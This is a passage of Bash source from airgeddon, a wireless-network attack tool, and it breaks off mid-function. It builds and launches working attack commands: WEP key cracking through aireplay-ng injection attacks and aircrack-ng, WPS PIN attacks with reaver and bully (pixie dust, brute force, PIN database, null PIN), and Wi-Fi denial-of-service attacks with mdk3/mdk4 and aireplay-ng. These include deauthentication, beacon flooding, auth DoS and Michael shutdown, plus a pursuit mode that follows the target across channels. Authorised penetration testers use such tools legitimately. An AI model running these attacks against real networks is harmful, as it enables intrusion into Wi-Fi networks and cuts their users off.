				manage_output "-bg \"#000000\" -fg \"#00FF00\" -geometry ${g5_left1} -T \"Fake Auth\"" "aireplay-ng -1 3 -o 1 -q 10 -a ${bssid} -h ${current_mac} ${interface}" "Fake Auth"
				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng -1 3 -o 1 -q 10 -a ${bssid} -h ${current_mac} ${interface}"
					wep_fakeauth_pid="\${global_process_pid}"
					global_process_pid=""
				else
					wep_fakeauth_pid=\$!
				fi
	EOF

	cat >&6 <<-'EOF'
				wep_script_processes+=(${wep_fakeauth_pid})
				write_wep_processes
				sleep 2
			fi

			if [ ${wep_to_be_launched_only_once} -eq 0 ]; then
				wep_to_be_launched_only_once=1
	EOF

	cat >&6 <<-EOF
				manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_left2} -T \"Arp Broadcast Injection\"" "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" "Arp Broadcast Injection"
				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}"
					wep_script_processes+=("\${global_process_pid}")
					global_process_pid=""
				else
					wep_script_processes+=(\$!)
				fi

				manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g5_left3} -T \"Arp Request Replay\"" "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" "Arp Request Replay"
				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}"
					wep_script_processes+=("\${global_process_pid}")
					global_process_pid=""
				else
					wep_script_processes+=(\$!)
				fi

				manage_output "-hold -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g5_left4} -T \"Caffe Latte Attack\"" "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Caffe Latte Attack"
				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}"
					wep_script_processes+=("\${global_process_pid}")
					global_process_pid=""
				else
					wep_script_processes+=(\$!)
				fi

				manage_output "-hold -bg \"#000000\" -fg \"#D3D3D3\" -geometry ${g5_left5} -T \"Hirte Attack\"" "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Hirte Attack"
				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}"
					wep_script_processes+=("\${global_process_pid}")
					global_process_pid=""
				else
					wep_script_processes+=(\$!)
				fi
	EOF

	cat >&6 <<-'EOF'
				write_wep_processes
			fi

			if [ ${wep_fragmentation_phase} -lt 4 ]; then
				wep_fragmentation_attack
			fi

			if [ ${wep_chopchop_phase} -lt 4 ]; then
				wep_chopchop_attack
			fi
	EOF

	cat >&6 <<-EOF
			ivs_cmd="grep WEP ${tmpdir}${wep_data}*.csv --exclude=*kismet* | head -n 1 "
	EOF

	cat >&6 <<-'EOF'
			ivs_cmd+="| awk '{print \$11}' FS=',' | sed 's/ //g'"

			current_ivs=$(eval "${ivs_cmd}")
			if [[ ${current_ivs} -ge 5000 ]] && [[ ${wep_aircrack_launched} -eq 0 ]]; then
				wep_aircrack_launched=1
	EOF

	cat >&6 <<-EOF
				manage_output "-bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_bottomright_window} -T \"Decrypting WEP Key\"" "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" "Decrypting WEP Key" "active"
				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aircrack-ng \"${tmpdir}${wep_data}\".*cap -l \"${tmpdir}${wepdir}wepkey.txt\""
					wep_aircrack_pid="\${global_process_pid}"
					global_process_pid=""
				else
					wep_aircrack_pid=\$!
				fi
	EOF

	cat >&6 <<-'EOF'
				wep_script_processes+=(${wep_aircrack_pid})
				write_wep_processes
			fi

			wep_aircrack_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_aircrack_pid}$" 2> /dev/null)
			if [[ -z "${wep_aircrack_pid_alive}" ]] && [[ ${wep_aircrack_launched} -eq 1 ]]; then
				break
			elif [[ -z "${wep_capture_pid_alive}" ]]; then
				break
			fi
		done
	EOF
}

#Execute wps custom pin bully attack
function exec_wps_custom_pin_bully_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "bully" "custompin"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS custom pin bully attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin bully attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin bully attack"
}

#Execute wps custom pin reaver attack
function exec_wps_custom_pin_reaver_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "custompin"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS custom pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin reaver attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin reaver attack"
}

#Execute bully pixie dust attack
function exec_bully_pixiewps_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "bully" "pixiedust"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS bully pixie dust attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully pixie dust attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully pixie dust attack"
}

#Execute reaver pixie dust attack
function exec_reaver_pixiewps_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "pixiedust"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS reaver pixie dust attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver pixie dust attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver pixie dust attack"
}

#Execute wps bruteforce pin bully attack
function exec_wps_bruteforce_pin_bully_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "bully" "bruteforce"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS bruteforce pin bully attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin bully attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin bully attack"
}

#Execute wps bruteforce pin reaver attack
function exec_wps_bruteforce_pin_reaver_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "bruteforce"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS bruteforce pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin reaver attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin reaver attack"
}

#Execute wps pin database bully attack
function exec_wps_pin_database_bully_attack() {

	debug_print

	wps_pin_database_prerequisites

	set_wps_attack_script "bully" "pindb"

	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS bully known pins database based attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully known pins database based attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully known pins database based attack"
}

#Execute wps pin database reaver attack
function exec_wps_pin_database_reaver_attack() {

	debug_print

	wps_pin_database_prerequisites

	set_wps_attack_script "reaver" "pindb"

	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS reaver known pins database based attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver known pins database based attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver known pins database based attack"
}

#Execute wps null pin reaver attack
function exec_reaver_nullpin_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "nullpin"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS null pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS null pin reaver attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS null pin reaver attack"
}

#Execute DoS pursuit mode attack
function launch_dos_pursuit_mode_attack() {

	debug_print

	rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
	rm -rf "${tmpdir}clts.csv" > /dev/null 2>&1
	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1

	if [[ -n "${2}" ]] && [[ "${2}" = "relaunch" ]]; then
		echo
		language_strings "${language}" 507 "yellow"
	fi

	recalculate_windows_sizes
	case "${1}" in
		"${mdk_command} amok attack")
			dos_delay=1
			interface_pursuit_mode_scan="${interface}"
			interface_pursuit_mode_deauth="${interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"aireplay deauth attack")
			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
			dos_delay=3
			interface_pursuit_mode_scan="${interface}"
			interface_pursuit_mode_deauth="${interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"wids / wips / wds confusion attack")
			dos_delay=10
			interface_pursuit_mode_scan="${interface}"
			interface_pursuit_mode_deauth="${interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"beacon flood attack")
			dos_delay=1
			interface_pursuit_mode_scan="${interface}"
			interface_pursuit_mode_deauth="${interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"auth dos attack")
			dos_delay=1
			interface_pursuit_mode_scan="${interface}"
			interface_pursuit_mode_deauth="${interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m -s 1024" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m -s 1024"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"michael shutdown attack")
			dos_delay=1
			interface_pursuit_mode_scan="${interface}"
			interface_pursuit_mode_deauth="${interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"${mdk_command}")
			dos_delay=1
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" "Deauth (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"Aireplay")
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
			iw "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			dos_delay=3
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "Deauth (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"Wds Confusion")
			dos_delay=10
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "Deauth (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
	esac

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		dos_pursuit_mode_attack_pid=$!
	fi
	dos_pursuit_mode_pids+=("${dos_pursuit_mode_attack_pid}")

	if [ "${channel}" -gt 14 ]; then
		if [ "${interface_pursuit_mode_scan}" = "${interface}" ]; then
			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				echo
				language_strings "${language}" 515 "red"
				kill_dos_pursuit_mode_processes
				language_strings "${language}" 115 "read"
				return 1
			else
				airodump_band_modifier="abg"
			fi
		else
			if [ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				echo
				language_strings "${language}" 515 "red"
				kill_dos_pursuit_mode_processes
				language_strings "${language}" 115 "read"
				return 1
			else
				airodump_band_modifier="abg"
			fi
		fi
	else
		if [ "${interface_pursuit_mode_scan}" = "${interface}" ]; then
			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				airodump_band_modifier="bg"
			else
				airodump_band_modifier="abg"
			fi
		else
			if [ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				airodump_band_modifier="bg"
			else
				airodump_band_modifier="abg"
			fi
		fi
	fi

	sleep ${dos_delay}
	airodump-ng -w "${tmpdir}dos_pm" "${interface_pursuit_mode_scan}" --band "${airodump_band_modifier}" > /dev/null 2>&1 &
	dos_pursuit_mode_scan_pid=$!
	dos_pursuit_mode_pids+=("${dos_pursuit_mode_scan_pid}")

	if [[ "${et_mode}" = "et_captive_portal" ]] || [[ -n "${enterprise_mode}" ]]; then

		local processes_file
		if [ "${et_mode}" = "et_captive_portal" ]; then
			processes_file="${tmpdir}${webdir}${et_processesfile}"
		elif [ -n "${enterprise_mode}" ]; then
			processes_file="${tmpdir}${enterprisedir}${enterprise_processesfile}"
		fi

		for item in "${dos_pursuit_mode_pids[@]}"; do
			echo "${item}" >> "${processes_file}"
		done
	fi
}

#Parse and control pids for DoS pursuit mode attack
pid_control_pursuit_mode() {

	debug_print

	if [[ -n "${2}" ]] && [[ "${2}" = "evil_twin" ]]; then
		rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
		echo "${channel}" > "${tmpdir}${channelfile}"
	fi

	while true; do
		sleep 5
		if grep "${bssid}" "${tmpdir}dos_pm-01.csv" > /dev/null 2>&1; then
			readarray -t DOS_PM_LINES_TO_PARSE < <(cat < "${tmpdir}dos_pm-01.csv" 2> /dev/null)

			for item in "${DOS_PM_LINES_TO_PARSE[@]}"; do
				if [[ "${item}" =~ ${bssid} ]]; then
					dos_pm_current_channel=$(echo "${item}" | awk -F "," '{print $4}' | sed 's/^[ ^t]*//')

					if [[ "${dos_pm_current_channel}" =~ ^([0-9]+)$ ]] && [[ "${BASH_REMATCH[1]}" -ne 0 ]] && [[ "${BASH_REMATCH[1]}" -ne "${channel}" ]]; then
						channel="${dos_pm_current_channel}"
						if [[ -n "${2}" ]] && [[ "${2}" = "evil_twin" ]]; then
							rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
							echo "${channel}" > "${tmpdir}${channelfile}"
						fi
						kill_dos_pursuit_mode_processes
						dos_pursuit_mode_pids=()
						launch_dos_pursuit_mode_attack "${1}" "relaunch"
					fi
				fi
			done
		fi

		dos_attack_alive=$(ps uax | awk '{print $2}' | grep -E "^${dos_pursuit_mode_attack_pid}$" 2> /dev/null)
		if [ -z "${dos_attack_alive}" ]; then
			break
		fi
	done

	kill_dos_pursuit_mode_processes
}

#Execute mdk deauth DoS attack
function exec_mdkdeauth() {

	debug_print

	echo
	language_strings "${language}" 89 "title"
	language_strings "${language}" 32 "green"

	tmpfiles_toclean=1
	rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
	echo "${bssid}" > "${tmpdir}bl.txt"

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		dos_pursuit_mode_pids=()
		launch_dos_pursuit_mode_attack "${mdk_command} amok attack" "first_time"
		pid_control_pursuit_mode "${mdk_command} amok attack"
	else
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack" "active"
		wait_for_process "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
	fi
}

#Execute aireplay DoS attack
function exec_aireplaydeauth() {

	debug_print

	echo
	language_strings "${language}" 90 "title"
	language_strings "${language}" 32 "green"

	tmpfiles_toclean=1

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		dos_pursuit_mode_pids=()
		launch_dos_pursuit_mode_attack "aireplay deauth attack" "first_time"
		pid_control_pursuit_mode "aireplay deauth attack"
	else
		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1

		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack" "active"
		wait_for_process "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
	fi
}

#Execute WDS confusion DoS attack
function exec_wdsconfusion() {

	debug_print

	echo
	language_strings "${language}" 91 "title"
	language_strings "${language}" 32 "green"

	tmpfiles_toclean=1

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		dos_pursuit_mode_pids=()
		launch_dos_pursuit_mode_attack "wids / wips / wds confusion attack" "first_time"
		pid_control_pursuit_mode "wids / wips / wds confusion attack"
	else
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack" "active"
		wait_for_process "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
	fi
}

#Execute Beacon flood DoS attack
function exec_beaconflood() {

	debug_print

	echo
	language_strings "${language}" 92 "title"
	language_strings "${language}" 32 "green"

	tmpfiles_toclean=1

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		dos_pursuit_mode_pids=()
		launch_dos_pursuit_mode_attack "beacon flood attack" "first_time"
		pid_control_pursuit_mode "beacon flood attack"
	else
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"beacon flood attack\"" "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack" "active"
		wait_for_process "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack"
	fi
}

#Execute Auth DoS attack
function exec_authdos() {

	debug_print

	echo
	language_strings "${language}" 93 "title"
	language_strings "${language}" 32 "green"

	tmpfiles_toclean=1

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		dos_pursuit_mode_pids=()
		launch_dos_pursuit_mode_attack "auth dos attack" "first_time"
		pid_control_pursuit_mode "auth dos attack"
	else
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m -s 1024" "auth dos attack" "active"
		wait_for_process "${mdk_command} ${interface} a -a ${bssid} -m -s 1024" "auth dos attack"
	fi
}

#Execute Michael Shutdown DoS attack
function exec_michaelshutdown() {

	debug_print

	echo
	language_strings "${language}" 94 "title"
	language_strings "${language}" 32 "green"

	tmpfiles_toclean=1

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		dos_pursuit_mode_pids=()
		launch_dos_pursuit_mode_attack "michael shutdown attack" "first_time"
		pid_control_pursuit_mode "michael shutdown attack"
	else
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"michael shutdown attack\"" "${mdk_command} ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack" "active"
		wait_for_process "${mdk_command} ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack"
	fi
}

#Validate mdk parameters
function mdk_deauth_option() {

	debug_print

	echo
	language_strings "${language}" 95 "title"
	language_strings "${language}" 35 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_bssid; then
		return
	fi

	if ! ask_channel; then
		return
	fi

	ask_yesno 505 "yes"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1
	fi

	exec_mdkdeauth
}

#Switch mdk version
function mdk_version_toggle() {

	debug_print

	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
		sed -ri "s:(AIRGEDDON_MDK_VERSION)=(mdk3):\1=mdk4:" "${rc_path}" 2> /dev/null
		AIRGEDDON_MDK_VERSION="mdk4"
	else
		sed -ri "s:(AIRGEDDON_MDK_VERSION)=(mdk4):\1=mdk3:" "${rc_path}" 2> /dev/null
		AIRGEDDON_MDK_VERSION="mdk3"
	fi

	set_mdk_version
}

#Set mdk to selected version validating its existence
function set_mdk_version() {

	debug_print

	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
		if ! hash mdk3 2> /dev/null; then
			echo
			language_strings "${language}" 636 "red"
			exit_code=1
			exit_script_option
		else
			mdk_command="mdk3"
		fi
	else
		mdk_command="mdk4"
	fi
}

#Validate Aireplay parameters
function aireplay_deauth_option() {

	debug_print

	echo
	language_strings "${language}" 96 "title"
	language_strings "${language}" 36 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_bssid; then
		return
	fi

	if ! ask_channel; then
		return
	fi

	ask_yesno 505 "yes"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1
	fi

	exec_aireplaydeauth
}

#Validate WDS confusion parameters
function wds_confusion_option() {

	debug_print

	echo
	language_strings "${language}" 97 "title"
	language_strings "${language}" 37 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_essid "verify"; then
		return
	fi

	if ! ask_channel; then
		return
	fi

	ask_yesno 505 "yes"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1
		echo
		language_strings "${language}" 508 "yellow"
		language_strings "${language}" 115 "read"
	fi

	exec_wdsconfusion
}

#Validate Beacon flood parameters
function beacon_flood_option() {

	debug_print

	echo
	language_strings "${language}" 98 "title"
	language_strings "${language}" 38 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_essid "verify"; then
		return
	fi

	if ! ask_channel; then
		return
	fi

	ask_yesno 505 "yes"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1
	fi

	exec_beaconflood
}

#Validate Auth DoS parameters
function auth_dos_option() {

	debug_print

	echo
	language_strings "${language}" 99 "title"
	language_strings "${language}" 39 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_bssid; then
		return
	fi

	ask_yesno 505 "yes"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1
		echo
		language_strings "${language}" 508 "yellow"
		language_strings "${language}" 115 "read"
	fi

	exec_authdos
}

#Validate Michael Shutdown parameters
function michael_shutdown_option() {

	debug_print

	echo
	language_strings "${language}" 100 "title"
	language_strings "${language}" 40 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_bssid; then
		return
	fi

